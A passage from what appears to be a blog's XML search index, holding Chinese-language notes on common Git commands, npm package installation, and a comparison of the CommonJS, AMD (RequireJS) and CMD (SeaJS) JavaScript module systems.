1:如果readme.txt还未存放到暂存区，执行后就回到和版本库一样的状态# 2:如果readme.txt已经存放到暂存区，执行完后就回到暂存区中一样的状态# 总之：就是回到上一次git add 或 git commit的状态# reflog记录每一次commit命令# 查看之前版本的commit id，然后可以返回来# 穿梭和回退# HEAD指向的版本就是当前的版本，使用命令 git reset --hard commit_id# 穿梭历史前：用 git log 先查看提交历史，确定要回退到历史的哪个版本# 要重返未来：用 git reflog 先查看命令历史，确定要回重回到未来的哪个版本# rm删除（先删除后提交）git rm test.txtgit commit -m "remove test.txt"rm -rf .git # 删除git信息，脱离gitfind . -name ".git" | xargs rm -Rf # 本地文件夹下的git文件，然后在重新初始化新建的git仓库# stash暂存git stash # 对当前的暂存区和工作区状态进行保存git stash list # 列出所有保存的进度列表git statsh pop [--index][&lt;stash&gt;] # 恢复工作进度# --index：不仅回复工作区，还恢复暂存区# &lt;stash&gt;：指定恢复一个具体进度，如果没有参数，默认恢复最新进度# 如：git stash pop --index stash@&#123;0&#125; 恢复编号为0的进度的工作区和暂存区# push将分支推送成为远端上的分支git push &lt;remote&gt; [branch]git push origin master:master # 将master分支下的本地修改push到master分支下（可初始化时提交未修改的分支，当前在其他分支时可使用，若当前已经在master分支，则使用 git push即可）# pull下载数据git pull # 从远端的服务器上下载数据，实现同步更新git pull origin master # 从其他分支上拉取master下的代码# clone克隆项目git clone **** # 首次克隆线上项目到本地,*****表示git地址 git reset1234567891011121314151617181920212223242526# reset(默认为--mixed)版本撤回git reset --soft HEAD # 回退时不重置暂存区和工作区git reset --mixed HEAD # 回退时重置缓存区，默认选项（--mixed可不写）git reset --hard HEAD # 回退时重置暂存区和工作区git reset HEAD^ # 回退到上一版本，并重置暂存区git reset HEAD~10 # 回退到10个版本之前，并重置暂存区git reset --hard HEAD^ # 回退到上一版本，并重置工作区和暂存区git reset --hard HEAD~10 # 回退到10个版本之前，并重置工作区和暂存区git reset # 不指定HEAD，用来清空暂存区的修改git reset filename # 清空暂存区中指定文件的修改git reset --hard # 不指定HEAD，用来清空工作区和暂存区的修改git reset --hard filename # 清空工作区和暂存区中指定文件的修改# 撤回时，首先判断是否需要版本回退（HEAD控制），再判断工作区是否保留（--hard控制）# 工作区撤回： git checkout / git checkout filename# 暂存区撤回（工作区保留）: git reset / git reset filename# 暂存区撤回（工作区不保留）: git reset --hard / git reset --hard filename# 版本区撤回（工作区保留）: git reset HEAD / git reset HEAD# 版本区撤回（工作区不保留）: git reset --hard HEAD / git reset --hard HEAD filename git branch1234567891011# branch分支git branch # 查看分支git branch -a # 查看所有远程分支git branch &lt;name&gt; # 创建分支git checkout &lt;name&gt; # 切换分支git checkout -b &lt;name&gt; # 创建+切换分支git merge &lt;name&gt; # 合并某分支到当前分支git branch -d &lt;name&gt; # 删除本地分支git push origin :master # 删除远程分支(或git push origin --delete master，只删除远程分支，本地不会删除)git for-each-ref --format='%(committerdate) %09 %(authorname) %09 %(refname)' | sort -k5n -k2M -k3n -k4n # 查看分支创建者和创建时间 git pull1234567891011121314151617181920git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;git pull origin next:master # 表示取回origin主机上的next分支与本地分支master合并git pull origin next # 表示拉取远程next分支与本地next分支合并# 等同于git fetch # 表示先从远程上获取最新版本到本地，不会自动合并git merge origin/next # 表示合并# 某些场合，git会在本地分支和远程分支之间建立一种tracking追踪关系，如git clone，通常为对应分支，也可手动建立追踪关系：git branch --set-upstream master origin/next # 表示指定本地的master分支追踪远程的origin/next分支# 当建立追踪关系后：git pull origin # 表示本地的当前分支自动与origin主机上的追踪分支进行合并，如上方的会将远程next分支拉取到本地master分支上git pull # 如果当前分支只有一个追踪的分支，可以省略origin，当前分支会自动与唯一一个追踪分支进行合并# 良好的拉取过程：git fetch origin master:tmp # 拉取远程的master分支到本地tmp分支git diff tmp # 对比本地分支和刚从master分支上拉取下来的差异git merge tmp # 合并 git push1234567git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;git push # 表示将当前分支推送到origin诸暨市的对应分支（操作当前分支）git push origin master # 表示将本地的master分支推送到origin主机的master分支，如果master不存在，则会被创建（可操作当前分支，也可操作其他分支）git push -u origin master # 当前分支与多个主机存在追踪关系，使用-u指定一个默认主机，之后就可以使用git push了git push --all origin # 将本地所有分支都推送到远程主机origingit push origin :master # 删除远程master分支，或git push origin --delete master git remote12345git remote set-url origin Url # 更换url（ssh url 和 http url）git remote -v # 查看远程git remote rm origin # 删除远程git remote add origin Url # 设置远程git remote prune origin # 清理远程无效分支 git config1234# config配置别名（配置目录在主目录下.gitconfig中，如不需要，删除记录即可）git config --global alias.st status # 将git status 配置成git stgit config --global alias.ad add # 将git add 配置成git adgit config --global alias.cm commit # 将git commit配置成git cm]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NPM安装插件]]></title>
    <url>%2Fblog%2Fnode%2Fnpm%E5%AE%89%E8%A3%85%E6%8F%92%E4%BB%B6.html</url>
    <content type="text"><![CDATA[安装组件要添加项目到您的package.json的devDependencies：12345npm i -D ***或：npm install &lt;package_name&gt; --save -dev 要添加项目到您的package.json的dependencies：12345npm i ***或：npm install &lt;package_name&gt; --save 删除组件1cnpm uninstall *** *** --save-dev 安装自动补全厂商前缀 安装autoprefixer-loader 1cnpm i -D autoprefixer-loader 配置loader 1234&#123; test: /\.scss$/, loader: 'autoprefixer!sass'&#125;]]></content>
      <tags>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CommonJS，RequireJS，SeaJS 归纳笔记]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs-module-loader.html</url>
    <content type="text"><![CDATA[文章出处 文章摘自Kaijun的博客：CommonJS,RequireJS,SeaJS归纳笔记 Foreword Here comes Module! 随着网站逐渐变成「互联网应用程序」，嵌入网页的 JavaScript 代码越来越庞大，越来越复杂。网页越来越像桌面程序，需要一个团队分工协作、进度管理、单元测试……我们不得不使用软件工程的方法，来管理网页的业务逻辑。 于是，JavaScript 的模块化成为迫切需求。在 ES6 Module 来临之前，JavaScript 社区提供了强大支持，尝试在现有的运行环境下，实现模块的效果。 Catalog CommonJS &amp; Node History RequireJS &amp; AMD SeaJS &amp; CMD AMD vs CMD WebPack 123function autoDetect()&#123; console.log(&apos;ye, it is written in JavaScript!&apos;)&#125; CommonJS &amp; Node Javascript: not just for browsers any more! —— CommonJS Slogen 前端模块化的事实标准之一，2009 年 8 月，CommonJS 诞生。 CommonJS 本质上只是一套规范（API 定义），而 Node.js 采用并实现了部分规范，CommonJS Module 的写法也因此广泛流行。 让我们看看 Node 中的实现：123456789// 由于 Node 原生支持模块的作用域，并不需要额外的 wrapper// "as though the module was wrapped in a function"var a = require('./a') // 加载模块（同步加载）a.doSomething() // 等上一句执行完才会执行exports.b = function()&#123; // 暴露 b 函数接口 // do something&#125; exports是一个内置对象，就像require是一个内置加载函数一样。如果你希望直接赋值一个完整的对象或者构造函数，覆写module.exports就可以了。 CommonJS 前身叫 ServerJS ，后来希望能更加 COMMON，成为通吃各种环境的模块规范，改名为 CommonJS 。CommonJS 最初只专注于 Server-side 而非浏览器环境，因此它采用了同步加载的机制，这对服务器环境（硬盘 I/O 速度）不是问题，而对浏览器环境（网速）来说并不合适。 因此，各种适用于浏览器环境的模块框架与标准逐个诞生，他们的共同点是： 采用异步加载（预先加载所有依赖的模块后回调执行，符合浏览器的网络环境） 虽然代码风格不同，但其实都可以看作 CommonJS Modules 语法的变体。 都在向着 COMMON 的方向进化：兼容不同风格，兼容浏览器和服务器两种环境 本文接下来要讨论的典例是： RequireJS &amp; AMD（异步加载，预执行，依赖前置。默认推荐 AMD 写法） SeaJS &amp; CMD（异步加载，懒执行，依赖就近，默认推荐 CommonJS 写法） History 此段落参考自玉伯的 前端模块化开发那点历史 09-10 年间，CommonJS（那时还叫 ServerJS） 社区推出 Modules/1.0 规范，并且在 Node.js 等环境下取得了很不错的实践。 09年下半年这帮充满干劲的小伙子们想把 ServerJS 的成功经验进一步推广到浏览器端，于是将社区改名叫 CommonJS，同时激烈争论 Modules 的下一版规范。分歧和冲突由此诞生，逐步形成了三大流派： Modules/1.x 流派。这个观点觉得 1.x 规范已经够用，只要移植到浏览器端就好。要做的是新增 Modules/Transport 规范，即在浏览器上运行前，先通过转换工具将模块转换为符合 Transport 规范的代码。主流代表是服务端的开发人员。现在值得关注的有两个实现：越来越火的 component 和走在前沿的 es6 module transpiler。 Modules/Async 流派。这个观点觉得浏览器有自身的特征，不应该直接用 Modules/1.x 规范。这个观点下的典型代表是 AMD 规范及其实现 RequireJS。这个稍后再细说。 Modules/2.0 流派。这个观点觉得浏览器有自身的特征，不应该直接用 Modules/1.x 规范，但应该尽可能与 Modules/1.x 规范保持一致。这个观点下的典型代表是 BravoJS 和 FlyScript 的作者。BravoJS 作者对 CommonJS 的社区的贡献很大，这份 Modules/2.0-draft 规范花了很多心思。FlyScript 的作者提出了 Modules/Wrappings 规范，这规范是 CMD 规范的前身。可惜的是 BravoJS 太学院派，FlyScript 后来做了自我阉割，将整个网站（flyscript.org）下线了。这个观点在本文中的典型代表就是 SeaJS 和 CMD 了 补一嘴：阿里 KISSY 的 KMD 其实跟 AMD 非常类似，只是用 add和use 两个源自于 YUI Modules 的函数名替换了 define 和 require ，但其原理更接近 RequireJS ，与 YUI Modules 的 Y 沙箱 Attach 机制并不相同 RequireJS &amp; AMDAMD (Async Module Definition) 是 RequireJS 在推广过程中对模块定义的规范化产出。 RequireJS is a JavaScript file and module loader. It is optimized for in-browser use, but it can be used in other JavaScript environments RequireJS 主要解决的还是 CommonJS 同步加载脚本不适合浏览器 这个问题： As the comment indicates above, if require() is async, this code will not work. However, loading scripts synchronously in the browser kills performance. So, what to do? 所以我们需要 Function Wrapping 来获取依赖并且提前通过 script tag 提前加载进来 当依赖模块非常多时，这种依赖前置的写法会显得有点奇怪，所以 AMD 给了一个语法糖， simplified CommonJS wrapping，借鉴了 CommonJS 的 require 就近风格，也更方便对 CommonJS 模块的兼容： 123456define(function (require) &#123; var dependency1 = require('dependency1'), dependency2 = require('dependency2'); return function () &#123;&#125;;&#125;); The AMD loader will parse out the require(&#39;&#39;) calls by using Function.prototype.toString(), then internally convert the above define call into this: 123456define(['require', 'dependency1', 'dependency2'], function (require) &#123; var dependency1 = require('dependency1'), dependency2 = require('dependency2'); return function () &#123;&#125;;&#125;); 出于Function.prototype.toString()兼容性和性能的考虑，最好的做法还是做一次 optimized build AMD 和 CommonJS 的核心争议如下： 1. 执行时机Modules/1.0: 1var a = require("./a") // 执行到此时，a.js 才同步下载并执行 AMD: （使用 require 的语法糖时） 12345define(["require"],function(require))&#123; // 在这里，a.js 已经下载并且执行好了 // 使用 require() 并不是 AMD 的推荐写法 var a = require("./a") // 此处仅仅是取模块 a 的 exports&#125;) AMD 里提前下载 a.js 是出于对浏览器环境的考虑，只能采取异步下载，这个社区都认可（Sea.js 也是这么做的） 但是 AMD 的执行是 Early Executing，而 Modules/1.0 是第一次 require 时才执行。这个差异很多人不能接受，包括持 Modules/2.0 观点的人也不能接受。 2. 书写风格AMD 推荐的风格并不使用require，而是通过参数传入，破坏了依赖就近： 12345define(["a", "b", "c"],function(a, b, c)&#123; // 提前申明了并初始化了所有模块 true || b.foo(); //即便根本没用到模块 b，但 b 还是提前执行了。&#125;) 不过，在笔者看来，风格喜好因人而异，主要还是预执行和懒执行的差异。 另外，require 2.0 也开始思考异步处理软依赖（区别于一定需要的硬依赖）的问题，提出了这样的方案： 123456// 函数体内：if(status)&#123; async(['a'],function(a)&#123; a.doSomething() &#125;)&#125; SeaJS &amp; CMDCMD (Common Module Definition) 是 SeaJS 在推广过程中对模块定义的规范化产出，是 Modules/2.0 流派的支持者，因此 SeaJS 的模块写法尽可能与 Modules/1.x 规范保持一致。 不过目前国外的该流派都死得差不多了，RequireJS 目前成为浏览器端模块的事实标准，国内最有名气的就是玉伯的 Sea.js ，不过对国际的推广力度不够。 CMD Specification English (CMDJS-repo) Chinese (SeaJS-repo) CMD 主要有 define, factory, require, export 这么几个东西 define define(id?, deps?, factory) factory factory(require, exports, module) require require(id) exports Object CMD 推荐的 Code Style 是使用 CommonJS 风格的 require： 这个 require 实际上是一个全局函数，用于加载模块，这里实际就是传入而已 12345678910111213define(function(require, exports) &#123; // 获取模块 a 的接口 var a = require('./a'); // 调用模块 a 的方法 a.doSomething(); // 对外提供 foo 属性 exports.foo = 'bar'; // 对外提供 doSomething 方法 exports.doSomething = function() &#123;&#125;;&#125;); 但是你也可以使用 AMD 风格，或者使用 return 来进行模块暴露 1234567891011define('hello', ['jquery'], function(require, exports, module) &#123; // 模块代码... // 直接通过 return 暴露接口 return &#123; foo: 'bar', doSomething: function() &#123;&#125; &#125;;&#125;); Sea.js 借鉴了 RequireJS 的不少东西，比如将 FlyScript 中的 module.declare 改名为 define 等。Sea.js 更多地来自 Modules/2.0 的观点，但尽可能去掉了学院派的东西，加入了不少实战派的理念。 AMD vs CMD虽然两者目前都兼容各种风格，但其底层原理并不相同，从其分别推荐的写法就可以看出两者背后原理的不同： 对于依赖的模块，AMD 是提前执行，CMD 是懒执行。（都是先加载） CMD 推崇依赖就近，AMD 推崇依赖前置。 看代码： 12345678// AMD 默认推荐define(['./a', './b'], function(a, b) &#123; // 依赖前置，提前执行 a.doSomething() b.doSomething()&#125;) 12345678910// CMDdefine(function(require, exports, module) &#123; var a = require('./a') a.doSomething() var b = require('./b') // 依赖就近，延迟执行 b.doSomething()&#125;) WebPack working… 文章出处 文章摘自Kaijun的博客：CommonJS,RequireJS,SeaJS归纳笔记]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
</search>
